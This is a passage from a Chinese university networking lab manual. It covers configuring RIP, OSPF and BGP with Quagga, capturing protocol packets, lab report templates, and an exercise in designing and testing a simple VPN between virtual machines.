    建立 <span class="s14">rip </span>配置文件 <span class="s14">ripd.conf</span>，内容如下：

        !-*-rip-*- hostname ripd password zebra router rip

        network _network_

        log stdout

        !

        <p style="text-indent: 0pt;text-align: left;">

        <span class="s13">注意，若有多个网络设备要运行 </span>RIP <span class="s13">协议，则要在配置文件中写入多条</span>&quot;network _network_&quot;<span class="s13">，</span>

        <span class="s27">network </span>表示网络设备，如 <span class="s14">eth0</span>。

            2.  启动 <span class="s14">wireshark </span>准备抓取报文，然后启动 <span class="s14">zebra</span>，<span class="s14">ripd </span>两个进程，使用命令如下 ：

    sudo systemctl start zebra sudo systemctl start ripd

        注意，当确保以上操作无误而<span class="s14">Route0</span>，<span class="s14">Route1</span>仍然无法<span class="s14">ping</span>通时，注意路由转发功能是否开启。
    5.  观察 <span class="s14">RIP </span>报文
2.  OSPF <span class="s23">协议观察</span>

    1.  按照提示安装<span class="s14">/</span>拷贝多个虚拟机

        2.  根据拓扑图连接一个简单链状网络拓扑图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_034.jpg)</span>

    注意：请为<span class="s14">router4 </span>预留一个网口

        3.  给每个连接在网络上的网卡设置 <span class="s14">ip</span>

    设置方式同 <span class="s14">1.</span>

        4.  运行 <span class="s14">OSPF </span>协议

            1.  在<span class="s14">/etc/quagga/</span>目录下添加两个配制文件 <span class="s14">zebra.conf </span>和 <span class="s14">ospfd.conf</span>。设置方式同 <span class="s14">1</span>。

    建立 <span class="s14">ospf </span>配置文件 <span class="s14">ospfd.conf</span>，内容如下：

    !-*-ospf-*- hostname ospfd password zebra router ospf

        network _a.b.c.d/m _area 0 log stdout

        !

        <p class="s13" style="padding-top: 4pt;padding-left: 6pt;text-indent: 0pt;line-height: 115%;text-align: left;">注意，若有多个网络设备要运行 <span class="s14">OSPF </span>协议，则要在配置文件中写入多条<span class="s14">&quot;network </span><span class="s27">a.b.c.d/ m </span><span class="s14">area 0&quot;</span>，<span class="s27">a.b.c.d/m </span>表示网络设备所处的网络，如 <span class="s14">192.168.1.0/24</span>。

            2.  启动 <span class="s14">wireshark </span>准备抓取报文，然后启动 <span class="s14">zebra</span>，<span class="s14">ospfd </span>两个进程，使用命令如下：

        sudo systemctl start zebra sudo systemctl start ospfd
    5.  观察<span class="s14">OSPF </span>报文
3.  BGP <span class="s23">协议观察</span>

    1.  根据拓扑图连接两个<span class="s14">AS</span>

    拓扑图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_035.jpg)</span>

        2.  给两个新连接的网卡设置 <span class="s14">ip</span>

    设置方式同 <span class="s14">1</span>。

        3.  运行<span class="s14">BGP </span>协议

            1.  在<span class="s14">/etc/quagga/</span>目录下添加配制文件<span class="s14">bgpd.conf</span>。

        bgpd <span class="s13">配置文件 </span>bgpd.conf <span class="s13">内容如下：</span>

    !-*-bgp-*- hostname bgpd password zebra router bgp _asn_

        bgp router-id _a.b.c.d_

        network _a.b.c.d/m_

        neighbor _a.b.c.d _remote-as _asn_

        log stdout

        !

        <p class="s14" style="padding-top: 7pt;padding-left: 7pt;text-indent: 0pt;line-height: 115%;text-align: left;"><span class="s13">其中</span>&quot;router bgp _asn_&quot;<span class="s13">中的 </span>_asn _<span class="s13">为</span>AS <span class="s13">号，例如 </span>100<span class="s13">。</span>&quot;bgp router-id _a.b.c.d_&quot;<span class="s13">中 </span>_a.b.c.d _<span class="s13">为网络设备的 </span>IP<span class="s13">。</span>&quot;network _a.b.c.d/m_&quot;<span class="s13">中 </span>_a.b.c.d/m _<span class="s13">为 </span>AS <span class="s13">内部网络地址的集。</span>_&quot;_neighbor _a.b.c.d _remote-as

        <span class="s27">asn</span><span class="s14">&quot;</span>中 <span class="s27">a.b.c.d </span>和 <span class="s27">asn </span>分别为相邻 <span class="s14">AS </span>的网络设备 <span class="s14">IP </span>和 <span class="s14">AS </span>号。

                2.  启动 <span class="s14">wireshark </span>准备抓取报文，然后启动<span class="s14">bgpd </span>进程，使用命令如下：

    sudo systemctl start bgpd

    注意，若配置正确，此刻<span class="s14">Router 3</span>，<span class="s14">Router 4</span>有<span class="s14">AS 1</span>，<span class="s14">AS 2</span>全部的路由表项，然而<span class="s14">AS 1</span>，<span class="s14">AS 2</span>

        内部的机器仍然只有其内部的路由表项
    4.  观察<span class="s14">BGP </span>报文
4.  观察路由表动态变更

    1.  观察初始网络情况

    观察 <span class="s14">router0 </span>的路由表，并追踪 <span class="s14">router0 </span>到 <span class="s14">router3 </span>的包传输路径，使用命令如下：

    tracepath _ip_

        2.  添加一条连接，变更原来的网络结构连接 <span class="s14">router0 </span>和 <span class="s14">router3</span>，拓扑图如下：

    <span>![image](计算机网络实验教材2.03(修订)/Image_036.jpg)</span>

        3.  观察变更后网络情况

            1.  给两个新连接的网卡设置 <span class="s14">ip</span>，设置方式同 <span class="s14">1</span>。

            2.  <span class="s13">在 </span>router0<span class="s13">，</span>router3 <span class="s13">中的 </span>ripd.conf <span class="s13">文件中加入</span>&quot;network _network_&quot;<span class="s13">，重启</span>quagga<span class="s13">。</span>

            3.  观察 <span class="s14">router0 </span>的路由表，并追踪 <span class="s14">router0 </span>到 <span class="s14">router3 </span>的包传输路径，使用命令同 <span class="s14">4.2</span>

### <a name="bookmark31">实验报告</a>

<table style="border-collapse:collapse" cellspacing="0"><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

实验目的
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:18pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

网络拓扑配置
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：填写附表 <span class="s19">1</span>，也可绘图说明
</td></tr><tr style="height:47pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

路由配置文件
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：即 <span class="s19">zebra.conf</span>，<span class="s19">ripd.conf</span>，<span class="s19">ospfd.conf</span>，<span class="s19">bgpd.conf</span>。根据实际配置给出实验结束时 <span class="s19">router0</span>，<span class="s19">router3</span>，<span class="s19">router4 </span>和 <span class="s19">router6 </span>中的配置

文件即可
</td></tr><tr style="height:38pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

数据包截图
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：用 <span class="s19">wireshark </span>抓包截图，<span class="s19">RIP</span>，<span class="s19">OSPF</span>，<span class="s19">BGP </span>报文各一，需要标明抓包的路由器和端口
</td></tr><tr style="height:22pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

协议报文分析
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：分析抓取的报文
</td></tr><tr style="height:21pt"><td style="width:101pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

观察动态路由
</td><td style="width:312pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

说明：比较网络变更前后<span class="s19">router0 </span>的路由表
</td></tr></table>

<p class="s13" style="padding-left: 7pt;text-indent: 20pt;line-height: 115%;text-align: left;">按要求完成实验，并写出实验报告。实验报告格式如下，同学可以根据内容进行修改。说明是为了更详细的解释各个项目，提交的报告中无需包含。

附表 <span class="s14">1</span>：
<table style="border-collapse:collapse;margin-left:22.27pt" cellspacing="0"><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

节点名
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

虚拟设备名
</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

ip
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

netmask
</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router0
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router1
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router2
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="3">

Router3
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="3">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth2:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router4
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

Router5
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt" rowspan="2">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth1:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr><tr style="height:16pt"><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

Router6
</td><td style="width:85pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td><td style="width:125pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

eth0:
</td><td style="width:90pt;border-top-style:solid;border-top-width:1pt;border-left-style:solid;border-left-width:1pt;border-bottom-style:solid;border-bottom-width:1pt;border-right-style:solid;border-right-width:1pt">

</td></tr></table>

## <a name="bookmark32">实验六 </a><span class="s12">VPN </span>设计、实现与分析

### <a name="bookmark33">背景知识</a>

VPN<span class="s6">，</span>Virtual Private Network<span class="s6">，也就是虚拟专用网。是一种通过一个公用网络建立一个临时的，安全的连接，是一条穿过混乱的公用网络的安全，稳定的隧道。常用的虚拟专用网协议有 </span>IPSec<span class="s6">，</span>PPTP<span class="s6">，</span>L2F<span class="s6">，</span>L2TP <span class="s6">以及 </span>GRE<span class="s6">。</span>IPSec <span class="s6">是 </span>IP Security <span class="s6">的缩写，是保护 </span>IP <span class="s6">协议安全通信的标准，它主要对 </span>IP <span class="s6">协议分组进行加密和认证。</span>PPTP <span class="s6">的全称是 </span>Point to Point Tunneling Protocol <span class="s6">点到点隧道协议。</span>L2F <span class="s6">是 </span>Layer 2 Forwarding,<span class="s6">也就是第二层转发协议的缩写。</span>L2TP <span class="s6">是 </span>Layer 2 Tunneling Protocol <span class="s6">第二层隧道协议的缩写。 </span>

GRE <span class="s6">是 </span>VPN <span class="s6">的第三层隧道协议。 </span>

当前<span class="s32">VPN </span>的需求很大，原因是随着集团公司规模的扩大以及其他的一些专用需求， 特定的私有网络得到很大的青睐，但是单独建设私有网络或者租用私有网络的成本很高，那么此时通过<span class="s32">VPN </span>实现的，建立在普通互联网技术之上的私有网络技术得到很多 <span class="s32">IT </span>部 门的认可。 

下面给出一些参考资料，大家可以查看他们来对<span class="s32">VPN </span>[获得更加深入的认识。 ](http://en.wikipedia.org/wiki/Virtual_private_network)[http://en.wikipedia.org/wiki/Virtual_private_network http://computer.howstuffworks.com/vpn.htm](http://computer.howstuffworks.com/vpn.htm)

同时大家如果有兴趣，可以参加开源 VPN 软件 <span class="s32">OpenVPN </span>的开发 

[www.openvpn.net](http://www.openvpn.net/)

另外还有一些有关 <span class="s32">VPN </span>实现的 <span class="s32">RFC </span>文档 

[http://www.ietf.org/rfc/rfc2637.txt](http://www.ietf.org/rfc/rfc2637.txt)

### <a name="bookmark34">实验目标</a>

本实验主要目的是设计和实现一个简单的虚拟专用网络的机制， 并与已有的标准实现（如 <span class="s32">PPTP</span>）进行比较， 进而让学生进一步理解 <span class="s32">VPN </span>的工作原理和内部实现细节。

### <a name="bookmark35">实验任务</a>

1 实验环境搭建 

首先明确我们的目的，我们是要实现一个简易的 <span class="s32">VPN</span>，从 <span class="s32">VPN </span>的定义来看,我们首先需要一个单独的网络来模拟因特网,其次对于每个连接<span class="s32">VPN </span>的主机,都需要一个<span class="s32">VPN</span>入口,也就是一个 <span class="s32">VPN </span>接入服务器,通过该服务器来实现主机的 <span class="s32">VPN </span>接入,该服务器负责将主机的发送包进行重封装并传递到目标 <span class="s32">VPN </span>主机，并接受传递到自身下属主机的

VPN <span class="s6">包，并跟据</span>VPN <span class="s6">解包规范进行包的解析，并传递要对应的</span>VPN <span class="s6">主机。 整个网络的拓扑如下：</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_037.jpg)</span>

图 <span class="s44">1</span>

其中<span class="s32">VPNServer1</span>，<span class="s32">Network</span>，<span class="s32">VPNServer2 </span>之间的连接可以看作是整个互联网，因为互联网只不过是众多的这样的连接的集合。 

其中 <span class="s32">PC 1</span>，<span class="s32">PC 2 </span>是接入<span class="s32">VPN </span>的 <span class="s32">2 </span>个主机。<span class="s32">VPNServer1 </span>和<span class="s32">VPNServer2 </span>是 <span class="s32">2 </span>个 <span class="s32">VPN</span>的接入口，实际上，我们要实现的<span class="s32">VPN </span>程序就是运行在 <span class="s32">2 </span>台机器上的。<span class="s32">Network</span>，一个配置了路由转发的主机，模拟了整个互联网络。我们最终的要求是 <span class="s32">PC 1 </span>可以通过<span class="s32">VPN</span>的 <span class="s32">IP </span>地址同<span class="s32">PC 2 </span>进行交互。<span class="s32">2 </span>者通过系统的网络配置无法互相沟通，而当在 <span class="s32">VPNServer1</span>和 <span class="s32">VPNServer2 </span>上运行<span class="s32">VPN </span>程序的时候，二者可以通过 <span class="s32">VPN </span>虚拟出来的 <span class="s32">IP </span>进行通讯。 为了完成以上的拓扑，做出如下配置。（默认 <span class="s32">eth0 </span>为左，<span class="s32">eth1 </span>为右）。

PC 1 <span class="s6">网络配置 </span>

PC <span class="s40">1#</span>**ifconfig eth0 10.0.0.2 netmask 255.255.255.0**

PC <span class="s40">1#</span>**route add default gw 10.0.0.1**

PC <span class="s40">1# </span>**sudo /etc/init.d/networking restart**

PC 2 <span class="s6">的配置同 </span>PC 1 <span class="s6">的配置类似</span>

PC <span class="s40">2#</span>**ifconfig eth0 10.0.1.2 netmask 255.255.255.0**

PC <span class="s40">2#</span>**route add default gw 10.0.1.1**

PC 2<span class="s40"># </span>**sudo /etc/init.d/networking restart**

下面配置 <span class="s32">2 </span>个<span class="s32">VPN </span>接入服务器<span class="s32">VPNServer1</span>，<span class="s32">VPNServer2</span> 

VPNServer1#<span class="s38">ifconfig eth0 10.0.0.1 netmask 255.255.255.0</span>

VPNServer1#<span class="s38">ifconfig eth1 192.168.0.2 netmask 255.255.255.0 </span>VPNServer1#<span class="s38">route add default gw 192.168.0.1 </span>VPNServer1# <span class="s38">sudo /etc/init.d/networking restart</span>

VPNServer2#<span class="s38">ifconfig eth0 172.0.0.2 netmask 255.255.255.0</span>

VPNServer2#<span class="s38">ifconfig eth1 10.0.1.1 netmask 255.255.255.0 </span>VPNServer2#<span class="s38">route add default gw 172.0.0.1 netmask 255.255.255.0 </span>VPNServer2# <span class="s38">sudo /etc/init.d/networking restart</span>

下面配置里面的虚拟路由器，用来模拟整个因特网的节点 <span class="s32">Network</span> 

Network#<span class="s38">ifconfig eth0 192.168.0.1 netmask 255.255.255.0</span>

Network #<span class="s38">ifconfig eth1 172.0.0.1 netmask 255.255.255.0 </span>Network #<span class="s38">echo 1 &gt; /proc/sys/net/ipv4/ip_forward </span>Network # <span class="s38">sudo /etc/init.d/networking restart</span>

2 程序实现 

当整个拓扑搭建完成之后，下面我们要做的事就是实现这个简单的 <span class="s32">VPN </span>程序。首先，我们要明确的是在实际的 <span class="s32">Internet </span>上面，跑的是标准的 <span class="s32">IP </span>包，<span class="s32">IP </span>包封装的才是真正的 <span class="s32">VPN </span>包。我们可以认为，在 <span class="s32">VPN </span>接入点上，就是将 <span class="s32">VPN </span>包进行重新封装，并传递到网络上。直到某个 <span class="s32">VPN </span>接入点接收到该包，解析包头确定其确是属于某个 <span class="s32">VPN </span>的包，然后将其重新解包并传递到内部的<span class="s32">VPN </span>节点上。一个基本的包在 <span class="s32">VPN </span>网络上传递的流程如下： 

一个标准的 <span class="s14">IP </span>包，包的内容未知，包头地址为 <span class="s14">VPN </span>地址

发送到<span class="s44">VPN</span>

<span>![image](计算机网络实验教材2.03(修订)/Image_038.png)</span>

接入口上

包被解析，被发现可以路由，将整个包作为内容添加必要头部信息，添加到一个标准的可以在网络上传输的 <span class="s14">IP </span>包中

VPN <span class="s13">接入口收到该包，将其解包，并查看内容头部信息，发现确是本接入点所在 </span>VPN <span class="s13">网络上的主机能接收的。将其重新解包，发送到目的主机。</span>

作为一个标准的 <span class="s14">IP </span>包在网络上进行传输，过程同一般的 <span class="s14">IP </span>包没有区别。目的地址为对应 <span class="s14">VPN </span>目的地址所在网络的接入口

包被接收，传输完毕

图 <span class="s44">2</span>

从 <span class="s32">VPN </span>接入点的角度来看，有如下流程图 

<span>![image](计算机网络实验教材2.03(修订)/Image_039.png)</span>

读取配置文件，设置基于 <span class="s14">VPN</span>

的基本路由，<span class="s14">ARP </span>缓存信息

对机器各个接口进行监听，如有包进入，将对包的类型进行检测

来 自 内 部 来 自 外 部

查询<span class="s14">VPN </span>虚拟路由，对收到的包进行重新打包，并发送到互联网上

查询 <span class="s14">VPN </span>虚拟路由以及其他信息，对该报进行解包，重新安插以太头部信息，并发送到相应节点上

图 <span class="s44">3</span>

由上面的图我们可以看到，该程序仍然相当于一个路由程序，只不过需要重新封装基于 <span class="s32">VPN </span>的包内容。联系实验 <span class="s32">2</span>，我们可以借用简单路由程序的数据结构。由于 <span class="s32">VPN</span>节点需要明确指出，所以，在这里需要更改。 

typedef struct device_ti{ char interface[8]; char mac_addr[6]; <span style=" color: #F00;">int is_entrance;</span>

}DEVICE_INFO_ITEM;

红色字体部分为新增的数据结构内部项，其他的都同简单路由协议。 针对包的重新封装和<span class="s32">VPN </span>包的解析工作主要集中在 <span class="s32">2 </span>个函数中实现 

i<span class="s40">nt repack_packet(char* buffer, int buffer_length,</span>

char* error_info, DEVICE_INFO_ITEM* device_item_table, int device_table_size,

ROUTE_TABLE_ITEM* route_item_table, int route_table_size);

int unpack_packet(char* buffer, int buffer_length,

char* error_info, DEVICE_INFO_ITEM* device_item_table,int device_table_size, ROUTE_TABLE_ITEM* route_item_table, int route_table_size,

ARP_TABLE_ITEM* arp_table,int arp_table_size)<span class="s7">；</span>

函数的作用由函数名标识。源代码详见 <span class="s32">vpn_all.c</span>

3 <span class="s23">测试验证</span>

首先需要编译程序，在<span class="s32">VPNServer1 </span>和<span class="s32">VPNServer2 </span>编译并运行程序。 

VPNServer1#gcc vpn_all.c –o vpn_all VPNServer1#./vpn_all

在 <span class="s32">VPNServer2 </span>的操作同<span class="s32">VPNServer1</span> 

然后从 <span class="s32">PC 1 </span>上进行操作 

<span class="s32">PC </span>1# ping 10.0.1.2 <span class="s7">（</span>10.0.1.2 <span class="s7">是 </span><span class="s32">PC </span>2 <span class="s7">的 </span>IP<span class="s7">）</span>

会看到如下回应 

<span>![image](计算机网络实验教材2.03(修订)/Image_040.jpg)</span>

图 <span class="s44">4</span>

为了确保不是系统自己的路由功能，将 <span class="s32">VPNServer1 </span>或者<span class="s32">VPNServer2 </span>上的任何一个

VPN <span class="s6">程序终止，就会发现 </span>

<span>![image](计算机网络实验教材2.03(修订)/Image_041.jpg)</span>

图 <span class="s44">5</span>

注：前部分收到的包是因为当时没有终止。 

在实验过程中如果不能达到联通效果， 请确保针对 <span class="s32">VPNServer1 </span>， <span class="s32">Network</span>，

VPNServer2 <span class="s6">的</span>iptables <span class="s6">服务被关闭或者重新配置符合该实验。 </span>

VPN <span class="s6">的一个经典实现是 </span>PPTP<span class="s6">，</span>PPTP <span class="s6">的全称是点对点隧道协议，是一种支持多协议虚拟专用网络的网络技术，它工作在第二层。</span>PPTP <span class="s6">是将 </span>PPP <span class="s6">帧封装在 </span>IP <span class="s6">数据包中，通过 </span>IP <span class="s6">网络如 </span>Internet <span class="s6">或者企业专用 </span>Intranet <span class="s6">等发送的。而本程序的实现，是通过将一个以太帧的前 </span>14 <span class="s6">位（对应于 </span>MAC <span class="s6">的目的地址和源地址）进行重新修改，然后将修改过的以太帧作为一个整体封装在一个 </span>IP <span class="s6">数据包内在网络上传输。修改以太帧的前 </span>14 <span class="s6">位的目的是标识其为一个 </span>VPN <span class="s6">包数据。整体来说，实现的整体思路是差不多的，不同的是封装在 </span>IP <span class="s6">数据包内的数据内容不是完全相同。 </span>

实验者需要理解 <span class="s32">VPN </span>的传输原理，并根据样例程序选择重新实现基于第二层或者第三层的 <span class="s32">VPN </span>程序,在标准的 <span class="s32">VPN </span>网络中，除了 <span class="s32">VPN </span>的接入点外，还有一个 <span class="s32">VPN </span>中心服务器，用来存放 <span class="s32">VPN </span>的路由，拓扑信息，实验者需根据个人情况进行设计添加。另外，作为一个递进式的网络实验，实验者需要将之前的路由程序应用于自己构建的程序测试拓扑网络之中。 

### <a name="bookmark36">实验报告</a>

由于本次实验着重程序的设计，试验报告中将不要求统一的配置性细节，大家可以根据上面的环境进行模拟或者自行设置实验环境。 

实验者需提交源代码以及实验报告。提交文件布局如下： 

<span>![image](计算机网络实验教材2.03(修订)/Image_042.jpg)</span>

